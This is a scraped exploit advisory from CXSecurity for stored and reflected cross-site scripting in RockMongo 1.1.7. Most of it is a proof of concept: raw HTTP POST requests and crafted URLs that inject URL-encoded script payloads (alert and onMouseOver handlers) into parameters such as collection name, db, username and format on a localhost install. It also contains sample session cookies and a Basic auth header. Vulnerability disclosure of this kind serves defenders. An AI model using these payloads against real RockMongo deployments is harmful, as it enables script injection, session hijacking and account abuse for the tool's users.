---
title: RockMongo 1.1.7 Stored Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2023050054
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-25
fetch_date: 2025-10-04T11:36:56.120336
---

# RockMongo 1.1.7 Stored Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **RockMongo 1.1.7 Stored Cross-Site Scripting (XSS)** **2023.05.24**  Credit:  **[Rafael](https://cxsecurity.com/author/Rafael/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: RockMongo 1.1.7 - Stored Cross-Site Scripting (XSS)
# Discovery by: Rafael Pedrero
# Discovery Date: 2020-09-19
# Vendor Homepage: https://github.com/iwind/rockmongo/
# Software Link : https://github.com/iwind/rockmongo/
# Tested Version: 1.1.7
# Tested on: Windows 7 and 10
# Vulnerability Type: Stored Cross-Site Scripting (XSS)
CVSS v3: 6.5
CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
CWE: CWE-79
Vulnerability description: RockMongo v1.1.7, does not sufficiently encode
user-controlled inputs, resulting in a stored and reflected Cross-Site
Scripting (XSS) vulnerability via the index.php, in multiple parameter.
Proof of concept:
Stored:
POST https://localhost/mongo/index.php?action=db.newCollection&db=local
HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://localhost
Connection: keep-alive
Referer: https://localhost/mongo/index.php?action=db.newCollection&db=local
Cookie: PHPSESSID=jtjuid60sv6j3encp3cqqps3f7; ROCK\_LANG=es\_es;
rock\_format=json
Upgrade-Insecure-Requests: 1
Host: localhost
name=%09%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&size=0&max=0
Reflected:
https://localhost/mongo/index.php?action=collection.index&db=%3C%2Ffont%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cfont%3E&collection=startup\_log
https://localhost/mongo/index.php?action=collection.index&db=local&collection=%3C%2Ffont%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cfont%3E
https://localhost/mongo/index.php?action=db.index&db=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
http://localhost/mongo/index.php?db=%3C%2Ffont%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cfont%3E&collection=startup\_log&action=collection.index&format=json&criteria=%7B%0D%0A%0D%0A%7D&newobj=%7B%0D%0A%09%27%24set%27%3A+%7B%0D%0A%09%09%2F%2Fyour+attributes%0D%0A%09%7D%0D%0A%7D&field%5B%5D=\_id&order%5B%5D=desc&field%5B%5D=&order%5B%5D=asc&field%5B%5D=&order%5B%5D=asc&field%5B%5D=&order%5B%5D=asc&limit=0&pagesize=10&command=findAll
http://localhost/mongo/index.php?db=local&collection=%3C%2Ffont%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cfont%3E&action=collection.index&format=json&criteria=%7B%0D%0A%0D%0A%7D&newobj=%7B%0D%0A%09%27%24set%27%3A+%7B%0D%0A%09%09%2F%2Fyour+attributes%0D%0A%09%7D%0D%0A%7D&field%5B%5D=\_id&order%5B%5D=desc&field%5B%5D=&order%5B%5D=asc&field%5B%5D=&order%5B%5D=asc&field%5B%5D=&order%5B%5D=asc&limit=0&pagesize=10&command=findAll
http://localhost/mongo/index.php?db=local&collection=startup\_log&action=collection.index&format=%27+onMouseOver%3D%27alert%281%29%3B&criteria=%7B%0D%0A%0D%0A%7D&newobj=%7B%0D%0A%09%27%24set%27%3A+%7B%0D%0A%09%09%2F%2Fyour+attributes%0D%0A%09%7D%0D%0A%7D&field%5B%5D=\_id&order%5B%5D=desc&field%5B%5D=&order%5B%5D=asc&field%5B%5D=&order%5B%5D=asc&field%5B%5D=&order%5B%5D=asc&limit=0&pagesize=10&command=findAll
POST http://localhost/mongo/index.php?action=login.index&host=0 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: https://localhost
Authorization: Basic cm9vdDpyb290
Connection: keep-alive
Referer: https://localhost/mongo/index.php?action=login.index&host=0
Cookie: ROCK\_LANG=es\_es; PHPSESSID=tpaptf0gtmas344agj5ia6srl1;
rock\_format=json
Upgrade-Insecure-Requests: 1
Host: localhost
more=0&host=0&username=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&password=\*\*\*\*&db=&lang=es\_es&expire=3
POST http://localhost/mongo/index.php?action=server.command& HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: https://localhost
Authorization: Basic cm9vdDpyb290
Connection: keep-alive
Referer: https://localhost/mongo/index.php?action=server.command&
Cookie: ROCK\_LANG=es\_es; PHPSESSID=tpaptf0gtmas344agj5ia6srl1;
rock\_format=json
Upgrade-Insecure-Requests: 1
Host: localhost
command=%7B%0D%0A++listCommands%3A+1%0D%0A%7D&db=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&format=json
POST http://localhost/mongo/index.php?action=server.execute& HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: https://localhost
Authorization: Basic cm9vdDpyb290
Connection: keep-alive
Referer: https://localhost/mongo/index.php?action=server.execute&
Cookie: ROCK\_LANG=es\_es; PHPSESSID=tpaptf0gtmas344agj5ia6srl1;
rock\_format=json
Upgrade-Insecure-Requests: 1
Host: localhost
code=function+%28%29+%7B%0D%0A+++var+plus+%3D+1+%2B+2%3B%0D%0A+++return+plus%3B%0D%0A%7D&db=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050054)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  -...